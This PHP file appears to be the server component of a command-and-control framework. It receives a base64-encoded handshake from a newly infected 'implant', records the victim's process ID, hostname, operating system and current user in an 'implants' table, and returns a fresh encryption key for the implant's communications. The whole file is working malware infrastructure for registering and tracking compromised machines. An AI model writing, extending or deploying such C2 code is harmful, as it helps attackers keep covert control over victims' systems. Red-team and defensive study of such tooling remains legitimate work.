<?php
    include "connector.php";
    include "randomize.php";

    # Gets Base64-encoded handshake
    $base64 = key($_POST);

    # Base64-decodes handshake
    $base64_decoded = base64_decode($base64);

    # URL decodes handshake
    $url_decoded = urldecode($base64_decoded);

    # Parses Base64-decoded handshake and separates by "&"
    $post_data = explode("&", $url_decoded);

    # Splits by "=" and gets process ID value
    $temp = explode("=", $post_data[0]);
    $process_id = $temp[1];

    # Splits by "=" and gets hostname value
    $temp = explode("=", $post_data[1]);
    $hostname = $temp[1];

    # Splits by "=" and gets operating system value
    $temp = explode("=", $post_data[2]);
    $os = $temp[1];

    # Splits by "=" and gets current user value
    $temp = explode("=", $post_data[3]);
    $current_user = $temp[1];

    # uniqid() is used to generate a new encryption key
    $encryption_key = generate_random_string();

    # TO DO: I should probably do some checks for valid data before INSERT'ing into the "implants" table

    # Adds a new implant row in the "implants" table (with newly-generated encryption key)
    # gmdate() is used to get the current date/time (in UTC)
    $statement = $database_connection->prepare("INSERT INTO `implants` (`process_id`, `hostname`, `os`, `current_user`, `encryption_key`, `last_seen`) VALUES (:process_id, :hostname, :os, :current_user, :encryption_key, :last_seen)");
    $statement->bindValue(":process_id", $process_id);
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":os", $os);
    $statement->bindValue(":current_user", $current_user);
    $statement->bindValue(":encryption_key", $encryption_key);
    $statement->bindValue(":last_seen", gmdate("Y-m-d H:i:s"));
    $statement->execute();
    $statement->connection = null;

    # Echoes out encryption key which is saved as an in-memory Python variable
    echo $encryption_key;
?>
